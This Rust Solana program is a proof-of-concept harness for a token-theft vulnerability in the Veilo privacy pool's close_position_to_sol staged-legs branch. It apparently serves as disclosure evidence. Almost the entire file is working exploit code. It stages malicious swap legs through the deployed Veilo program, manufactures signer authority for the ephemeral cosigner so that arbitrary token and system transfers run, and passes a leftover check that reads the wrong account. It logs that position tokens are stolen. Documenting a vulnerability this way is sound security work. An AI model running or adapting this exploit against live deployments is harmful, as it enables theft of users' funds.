//! Surfpool composition witness for the close_position_to_sol staged-legs theft.
//!
//! This program is a line-cited copy of the POST-PROOF mechanics of Veilo's
//! `close_position_to_sol` staged-legs branch (programs/privacy-pool/src/positions.rs
//! at frozen revision d81bb1f8d95738ef0fc13fd666333dfaf4757f71). The Groth16 proof
//! gate and the surrounding privacy-pool accounting are out of scope here because
//! the production SWAP proving artifacts are not public (documented blocker); every
//! other element of the vulnerable sequence is reproduced verbatim, executed against
//! the real System / SPL Token / Token-2022 programs inside a Surfpool mainnet fork,
//! with the malicious legs staged through the DEPLOYED Veilo program's
//! `stage_swap_legs` instruction.
//!
//! Citation format: `positions.rs:<lines>` refers to the frozen source.

use solana_program::{
    account_info::AccountInfo,
    entrypoint,
    entrypoint::ProgramResult,
    hash::{hash as sha256},
    instruction::{AccountMeta, Instruction},
    msg,
    program::{invoke, invoke_signed},
    program_error::ProgramError,
    pubkey::Pubkey,
};

entrypoint!(process_instruction);

// ---- Constants copied from the Veilo source -------------------------------

/// positions.rs:37 — Token-2022 program
pub const TOKEN_2022_PROGRAM_ID: Pubkey = solana_program::pubkey!("TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb");
/// positions.rs:40-42 — Associated Token program
pub const ASSOCIATED_TOKEN_PROGRAM_ID: Pubkey =
    solana_program::pubkey!("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL");
/// lib.rs:110 — Jupiter V6
pub const JUPITER_PROGRAM_ID: Pubkey = solana_program::pubkey!("JUP6LkbZbjS1jKKwapdHNy74zcZ3tLUZoi5QNyVTaV4");
/// positions.rs:1825 — Memo program
pub const MEMO_PROGRAM_ID: Pubkey = solana_program::pubkey!("MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr");
/// lib.rs:103 — SPL Token program
pub const TOKEN_PROGRAM_ID: Pubkey = solana_program::pubkey!("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
/// Deployed Veilo privacy_pool program (staged legs flow through it)
pub const VEILO_PROGRAM_ID: Pubkey = solana_program::pubkey!("GYy4kM6GHhpgLCUscuABbzkD2ZbJ2fneYryaZ6Ch7fFU");

/// positions.rs:1805 — "juplegs\0"
const JUP_LEGS_SENTINEL: [u8; 8] = [0x6a, 0x75, 0x70, 0x6c, 0x65, 0x67, 0x73, 0x00];
/// positions.rs:203
const COSIGNER_RENT_BUFFER_LAMPORTS: u64 = 20_000_000;

/// sha256("account:SwapLegsBuffer")[..8] — Anchor discriminator of the buffer
/// account created by the DEPLOYED Veilo program's stage_swap_legs.
fn anchor_account_disc(name: &str) -> [u8; 8] {
    let preimage = format!("account:{}", name);
    let b = sha256(preimage.as_bytes()).to_bytes();
    [b[0], b[1], b[2], b[3], b[4], b[5], b[6], b[7]]
}

fn instruction_disc(name: &str) -> [u8; 8] {
    let preimage = format!("harness:{}", name);
    let b = sha256(preimage.as_bytes()).to_bytes();
    [b[0], b[1], b[2], b[3], b[4], b[5], b[6], b[7]]
}

// ---- JupLeg (positions.rs:1811-1816) ---------------------------------------

pub struct JupLeg {
    pub program_id: Pubkey,
    pub account_indices: Vec<u8>,
    pub data: Vec<u8>,
}

/// Borsh deserialization of Vec<JupLeg> — byte-identical layout to Anchor's
/// `Vec::<JupLeg>::try_from_slice(&swap_data[8..])` (positions.rs:1838-1840).
fn parse_legs(bytes: &[u8]) -> Result<Vec<JupLeg>, ProgramError> {
    let mut i = 0usize;
    let read_u32 = |i: &mut usize| -> Result<u32, ProgramError> {
        if *i + 4 > bytes.len() {
            return Err(ProgramError::InvalidInstructionData);
        }
        let v = u32::from_le_bytes([bytes[*i], bytes[*i + 1], bytes[*i + 2], bytes[*i + 3]]);
        *i += 4;
        Ok(v)
    };
    let n = read_u32(&mut i)? as usize;
    if n > 64 {
        return Err(ProgramError::InvalidInstructionData);
    }
    let mut legs = Vec::with_capacity(n);
    for _ in 0..n {
        if i + 32 > bytes.len() {
            return Err(ProgramError::InvalidInstructionData);
        }
        let mut pk = [0u8; 32];
        pk.copy_from_slice(&bytes[i..i + 32]);
        i += 32;
        let na = read_u32(&mut i)? as usize;
        if i + na > bytes.len() {
            return Err(ProgramError::InvalidInstructionData);
        }
        let account_indices = bytes[i..i + na].to_vec();
        i += na;
        let nd = read_u32(&mut i)? as usize;
        if i + nd > bytes.len() {
            return Err(ProgramError::InvalidInstructionData);
        }
        let data = bytes[i..i + nd].to_vec();
        i += nd;
        legs.push(JupLeg { program_id: Pubkey::new_from_array(pk), account_indices, data });
    }
    Ok(legs)
}

// ---- Copied helpers (line-cited) --------------------------------------------

/// positions.rs:1819-1826 — is_allowed_leg_program
fn is_allowed_leg_program(p: &Pubkey) -> bool {
    *p == solana_program::system_program::ID
        || *p == TOKEN_PROGRAM_ID
        || *p == TOKEN_2022_PROGRAM_ID
        || *p == ASSOCIATED_TOKEN_PROGRAM_ID
        || *p == JUPITER_PROGRAM_ID
        || *p == MEMO_PROGRAM_ID
}

/// positions.rs:149-154 — get_ata_address (Token and Token-2022 share the layout)
fn get_ata_address(authority: &Pubkey, mint: &Pubkey, token_program: &Pubkey) -> Pubkey {
    Pubkey::find_program_address(
        &[authority.as_ref(), token_program.as_ref(), mint.as_ref()],
        &ASSOCIATED_TOKEN_PROGRAM_ID,
    ).0
}

/// positions.rs:141-146 — get_mint_decimals
fn get_mint_decimals(mint_info: &AccountInfo) -> Result<u8, ProgramError> {
    let data = mint_info.try_borrow_data()?;
    if data.len() < 45 {
        return Err(ProgramError::InvalidAccountData);
    }
    Ok(data[44])
}

/// positions.rs:2157-2169 — read_token_amount_unchecked
fn read_token_amount_unchecked(account: &AccountInfo) -> Result<u64, ProgramError> {
    if account.owner != &TOKEN_PROGRAM_ID && account.owner != &TOKEN_2022_PROGRAM_ID {
        return Err(ProgramError::InvalidAccountOwner);
    }
    let data = account.try_borrow_data()?;
    if data.len() < 72 {
        return Err(ProgramError::InvalidAccountData);
    }
    Ok(u64::from_le_bytes(
        data[64..72].try_into().map_err(|_| ProgramError::InvalidAccountData)?,
    ))
}

/// positions.rs:2007-2040 — token_2022_transfer_checked (raw CPI)
fn token_2022_transfer_checked<'a>(
    from: &AccountInfo<'a>,
    mint: &AccountInfo<'a>,
    to: &AccountInfo<'a>,
    authority: &AccountInfo<'a>,
    signer_seeds: &[&[u8]],
    amount: u64,
    decimals: u8,
    token_2022_program: &AccountInfo<'a>,
) -> ProgramResult {
    let mut data = vec![12u8]; // transfer_checked
    data.extend_from_slice(&amount.to_le_bytes());
    data.push(decimals);

    let ix = Instruction {
        program_id: TOKEN_2022_PROGRAM_ID,
        accounts: vec![
            AccountMeta::new(*from.key, false),
            AccountMeta::new_readonly(*mint.key, false),
            AccountMeta::new(*to.key, false),
            AccountMeta::new_readonly(*authority.key, true),
        ],
        data,
    };

    invoke_signed(
        &ix,
        &[from.clone(), mint.clone(), to.clone(), authority.clone(), token_2022_program.clone()],
        &[signer_seeds],
    )?;

    Ok(())
}

/// positions.rs:1831-1871 — execute_jup_legs.
/// The executor PDA signs via invoke_signed; every account whose key equals the
/// executor OR the ephemeral cosigner is manufactured into a signer meta
/// (positions.rs:1853) — the cosigner's signature comes from the outer
/// transaction, so arbitrary Token/System legs execute with its authority.
fn execute_jup_legs<'a>(
    executor: &Pubkey,
    executor_seeds: &[&[u8]],
    cosigner: Pubkey,
    legs_bytes: &[u8],
    remaining: &[AccountInfo<'a>],
) -> ProgramResult {
    let legs = parse_legs(legs_bytes)?;
    let exec_key = *executor;
    for leg in legs.iter() {
        if !is_allowed_leg_program(&leg.program_id) {
            // positions.rs:1843
            msg!("leg program not allowed");
            return Err(ProgramError::InvalidArgument);
        }
        let mut metas = Vec::with_capacity(leg.account_indices.len());
        let mut infos = Vec::with_capacity(leg.account_indices.len());
        for &idx in leg.account_indices.iter() {
            let acc = remaining
                .get(idx as usize)
                .ok_or(ProgramError::InvalidArgument)?;
            // positions.rs:1853 — signer manufacturing
            let is_signer = acc.key == &exec_key || acc.key == &cosigner;
            metas.push(if acc.is_writable {
                AccountMeta::new(*acc.key, is_signer)
            } else {
                AccountMeta::new_readonly(*acc.key, is_signer)
            });
            infos.push(acc.clone());
        }
        let ix = Instruction {
            program_id: leg.program_id,
            accounts: metas,
            data: leg.data.clone(),
        };
        // positions.rs:1868
        invoke_signed(&ix, &infos, &[executor_seeds])?;
    }
    Ok(())
}

/// positions.rs:2075-2103 — close_cosigner_ata_if_empty (SPL/Token-2022 share
/// the close_account instruction index 9). Authority = cosigner via outer
/// signature, hence plain `invoke`.
fn close_cosigner_ata_if_empty<'a>(
    ata: &AccountInfo<'a>,
    cosigner: &AccountInfo<'a>,
    relayer: &AccountInfo<'a>,
    token_program: &AccountInfo<'a>,
) -> ProgramResult {
    let amount = read_token_amount_unchecked(ata)?;
    if amount != 0 {
        return Ok(());
    }
    let ix = Instruction {
        program_id: *token_program.key,
        accounts: vec![
            AccountMeta::new(*ata.key, false),
            AccountMeta::new(*relayer.key, false),
            AccountMeta::new_readonly(*cosigner.key, true),
        ],
        data: vec![9u8],
    };
    invoke(&ix, &[ata.clone(), relayer.clone(), cosigner.clone(), token_program.clone()])?;
    Ok(())
}

/// positions.rs:348-367 — validate_fee_to_vault (mirror, incl. configured
/// percentage/minimum swap-fee guard). `swap_fee_bps` and `min_swap_fee` are the
/// destination pool's configured values, passed as instruction args so the harness
/// reproduces the production guard with real config.
fn validate_fee_to_vault(
    received: u64,
    min_amount_out: u64,
    relayer_fee: u64,
    dest_amount: u64,
    swap_fee_bps: u16,
    min_swap_fee: u64,
) -> Result<u64, ProgramError> {
    if received < min_amount_out {
        return Err(ProgramError::InvalidArgument); // InvalidPublicAmount
    }
    if received <= relayer_fee {
        return Err(ProgramError::InvalidArgument);
    }
    // positions.rs:358-361 — pct_fee = received * swap_fee_bps / 10_000
    let pct_fee = (received as u128)
        .checked_mul(swap_fee_bps as u128)
        .and_then(|x| x.checked_div(10_000))
        .ok_or(ProgramError::InvalidArgument)? as u64;
    // positions.rs:362 — min_fee = max(min_swap_fee, pct_fee)
    let min_fee = std::cmp::max(min_swap_fee, pct_fee);
    // positions.rs:363 — require!(relayer_fee >= min_fee)
    if relayer_fee < min_fee {
        return Err(ProgramError::InvalidArgument); // InsufficientFee
    }
    let vault_amount = received.saturating_sub(relayer_fee);
    if vault_amount < dest_amount {
        return Err(ProgramError::InvalidArgument);
    }
    Ok(vault_amount)
}

// ---- Harness instruction ----------------------------------------------------

/// Account layout (named 7 + remaining):
///   [0] source_mint            — Token-2022 mint of the position token (read)
///   [1] position_vault_pda     — harness PDA, seeds [b"position_vault_token_v1", mint]
///   [2] position_vault_ata     — vault's position-token ATA, holds swap_amount
///   [3] relayer                — signer, mut (pays rent buffer; receives sweep)
///   [4] sol_vault              — harness PDA, seeds [b"privacy_vault_v3", default]
///   [5] executor_source_token  — SPL token account (the INEFFECTIVE leftover check)
///   [6] system_program
/// remaining (mirrors Veilo remaining_accounts):
///   [0] buffer                 — SwapLegsBuffer PDA owned by the DEPLOYED Veilo program
///   [1] cosigner               — signer, mut (ephemeral wallet; signed outer tx)
///   [2] cosigner_meme_ata      — must equal ATA(cosigner, source_mint, t22)
///   [3..]                      — arbitrary leg accounts
///
/// Instruction data (after 8-byte disc):
///   nullifier [u8;32] | swap_data_hash [u8;32] | swap_amount u64
///   | min_amount_out u64 | dest_amount u64 | relayer_fee u64
///   | swap_fee_bps u16 | min_swap_fee u64
pub fn process_instruction(
    program_id: &Pubkey,
    accounts: &[AccountInfo],
    instruction_data: &[u8],
) -> ProgramResult {
    let expected_disc = instruction_disc("run_malicious_close");
    if instruction_data.len() < 8 || instruction_data[..8] != expected_disc {
        return Err(ProgramError::InvalidInstructionData);
    }
    if instruction_data.len() != 8 + 32 + 32 + 8 + 8 + 8 + 8 + 2 + 8 {
        return Err(ProgramError::InvalidInstructionData);
    }
    let mut o = 8usize;
    let mut nullifier = [0u8; 32];
    nullifier.copy_from_slice(&instruction_data[o..o + 32]);
    o += 32;
    let mut swap_data_hash = [0u8; 32];
    swap_data_hash.copy_from_slice(&instruction_data[o..o + 32]);
    o += 32;
    let swap_amount = u64::from_le_bytes(instruction_data[o..o + 8].try_into().unwrap());
    o += 8;
    let min_amount_out = u64::from_le_bytes(instruction_data[o..o + 8].try_into().unwrap());
    o += 8;
    let dest_amount = u64::from_le_bytes(instruction_data[o..o + 8].try_into().unwrap());
    o += 8;
    let relayer_fee = u64::from_le_bytes(instruction_data[o..o + 8].try_into().unwrap());
    o += 8;
    let swap_fee_bps = u16::from_le_bytes(instruction_data[o..o + 2].try_into().unwrap());
    o += 2;
    let min_swap_fee = u64::from_le_bytes(instruction_data[o..o + 8].try_into().unwrap());

    if accounts.len() < 7 + 3 {
        return Err(ProgramError::NotEnoughAccountKeys);
    }
    let source_mint = &accounts[0];
    let vault_pda_ai = &accounts[1];
    let vault_ata = &accounts[2];
    let relayer = &accounts[3];
    let sol_vault = &accounts[4];
    let executor_source_token = &accounts[5];
    let system_program = &accounts[6];
    let remaining = &accounts[7..];
    let buffer = &remaining[0];
    let cosigner = &remaining[1];
    let cosigner_meme_ata = &remaining[2];

    if !relayer.is_signer || !cosigner.is_signer {
        return Err(ProgramError::MissingRequiredSignature);
    }

    // PDAs (same seed literals as Veilo)
    let (vault_pda, vault_bump) = Pubkey::find_program_address(
        &[b"position_vault_token_v1", source_mint.key.as_ref()],
        program_id,
    );
    if vault_pda_ai.key != &vault_pda {
        msg!("vault pda mismatch");
        return Err(ProgramError::InvalidArgument);
    }
    let vault_seeds: &[&[u8]] = &[
        b"position_vault_token_v1",
        source_mint.key.as_ref(),
        &[vault_bump],
    ];
    // positions.rs:1600-1607 — executor seeds (dest_mint = SOL sentinel)
    let sol_sentinel = Pubkey::default();
    let (executor_pda, executor_bump) = Pubkey::find_program_address(
        &[
            b"position_executor",
            source_mint.key.as_ref(),
            sol_sentinel.as_ref(),
            nullifier.as_ref(),
            relayer.key.as_ref(),
        ],
        program_id,
    );
    let executor_seeds: &[&[u8]] = &[
        b"position_executor",
        source_mint.key.as_ref(),
        sol_sentinel.as_ref(),
        nullifier.as_ref(),
        relayer.key.as_ref(),
        &[executor_bump],
    ];
    let (sol_vault_pda, _) = Pubkey::find_program_address(
        &[b"privacy_vault_v3", sol_sentinel.as_ref()],
        program_id,
    );
    if sol_vault.key != &sol_vault_pda {
        msg!("sol vault pda mismatch");
        return Err(ProgramError::InvalidArgument);
    }

    // ---- Read the legs staged through the DEPLOYED Veilo program ----------
    if buffer.owner != &VEILO_PROGRAM_ID {
        msg!("buffer not owned by deployed Veilo program");
        return Err(ProgramError::InvalidAccountOwner);
    }
    {
        let data = buffer.try_borrow_data()?;
        if data.len() < 77 || data[..8] != anchor_account_disc("SwapLegsBuffer") {
            msg!("buffer is not a SwapLegsBuffer account");
            return Err(ProgramError::InvalidAccountData);
        }
        let legs_len = u32::from_le_bytes(data[73..77].try_into().unwrap()) as usize;
        if data.len() < 77 + legs_len {
            return Err(ProgramError::InvalidAccountData);
        }
        let legs = &data[77..77 + legs_len];
        // positions.rs:2420-2421 — staged blob must start with the sentinel
        if legs.len() < 8 || legs[..8] != JUP_LEGS_SENTINEL {
            msg!("staged blob missing JUP_LEGS_SENTINEL");
            return Err(ProgramError::InvalidArgument);
        }
        // positions.rs:1906-1907 — runtime hash binding (NOT proof binding)
        let computed = sha256(legs);
        if computed.to_bytes() != swap_data_hash {
            msg!("swap_data_hash mismatch");
            return Err(ProgramError::InvalidArgument);
        }
    }
    msg!("staged legs accepted: sha256(legs) == swap_data_hash (runtime check only)");

    // ---- 1. Vault -> cosigner transfer (positions.rs:1668-1692) ------------
    let expected_cosigner_ata =
        get_ata_address(cosigner.key, source_mint.key, &TOKEN_2022_PROGRAM_ID);
    if cosigner_meme_ata.key != &expected_cosigner_ata {
        msg!("cosigner meme ATA mismatch");
        return Err(ProgramError::InvalidArgument);
    }
    let vault_ata_before = read_token_amount_unchecked(vault_ata)?;
    let cosigner_ata_before = read_token_amount_unchecked(cosigner_meme_ata)?;
    let decimals = get_mint_decimals(source_mint)?;
    let t22_info = remaining
        .iter()
        .find(|a| a.key == &TOKEN_2022_PROGRAM_ID)
        .ok_or(ProgramError::InvalidArgument)?;
    token_2022_transfer_checked(
        vault_ata,
        source_mint,
        cosigner_meme_ata,
        vault_pda_ai,
        vault_seeds,
        swap_amount,
        decimals,
        t22_info,
    )?;
    msg!(
        "vault->cosigner: vault_ata {} -> {}, cosigner_ata {} -> {}",
        vault_ata_before,
        read_token_amount_unchecked(vault_ata)?,
        cosigner_ata_before,
        read_token_amount_unchecked(cosigner_meme_ata)?
    );

    // ---- 2. Relayer rent buffer (positions.rs:1694-1698) -------------------
    {
        let ix = solana_program::system_instruction::transfer(
            relayer.key,
            cosigner.key,
            COSIGNER_RENT_BUFFER_LAMPORTS,
        );
        invoke(&ix, &[relayer.clone(), cosigner.clone(), system_program.clone()])?;
    }

    // ---- 3. before / staged legs / after (positions.rs:1699-1718) ----------
    let before = cosigner.lamports();
    {
        let data = buffer.try_borrow_data()?;
        let legs_len = u32::from_le_bytes(data[73..77].try_into().unwrap()) as usize;
        let legs = data[77..77 + legs_len].to_vec();
        drop(data);
        // positions.rs:1700-1714 — execute_dex_swap staged-legs branch
        execute_jup_legs(&executor_pda, executor_seeds, *cosigner.key, &legs[8..], remaining)?;
    }
    let after = cosigner.lamports();
    let sol_received = after
        .checked_sub(before)
        .ok_or(ProgramError::InvalidArgument)?; // positions.rs:1715-1718
    msg!("sol_received (cosigner lamport delta) = {}", sol_received);

    // ---- 4. Fee validation mirror (positions.rs:348-367, 1731-1738) --------
    let vault_sol = validate_fee_to_vault(sol_received, min_amount_out, relayer_fee, dest_amount, swap_fee_bps, min_swap_fee)?;
    msg!("vault_sol = {} (fee {}, swap_fee_bps {}, min_swap_fee {})", vault_sol, relayer_fee, swap_fee_bps, min_swap_fee);

    // ---- 5. Deposit proceeds to SOL vault (positions.rs:1745-1754) ---------
    {
        let ix =
            solana_program::system_instruction::transfer(cosigner.key, sol_vault.key, vault_sol);
        invoke(&ix, &[cosigner.clone(), sol_vault.clone(), system_program.clone()])?;
    }

    // ---- 6. Sweep residual cosigner lamports to relayer (positions.rs:1755-1759) ----
    {
        let residual = cosigner.lamports();
        if residual > 0 {
            let ix =
                solana_program::system_instruction::transfer(cosigner.key, relayer.key, residual);
            invoke(&ix, &[cosigner.clone(), relayer.clone(), system_program.clone()])?;
        }
    }

    // ---- 7. Close the drained source ATA (positions.rs:1720-1727) ----------
    let t22_info = remaining
        .iter()
        .find(|a| a.key == &TOKEN_2022_PROGRAM_ID)
        .ok_or(ProgramError::InvalidArgument)?;
    close_cosigner_ata_if_empty(cosigner_meme_ata, cosigner, relayer, t22_info)?;

    // ---- 8. The INEFFECTIVE executor leftover check (positions.rs:1770-1774) ----
    let executor_source_amount = read_token_amount_unchecked(executor_source_token)?;
    if executor_source_amount != 0 {
        return Err(ProgramError::InvalidArgument); // SwapLeftoverTokens — never trips
    }
    msg!("executor_source_token amount == 0 -> leftover check PASSES (wrong account)");

    msg!(
        "RESULT: position tokens stolen from cosigner ATA; user SOL note backed by vault_sol = {}",
        vault_sol
    );
    Ok(())
}
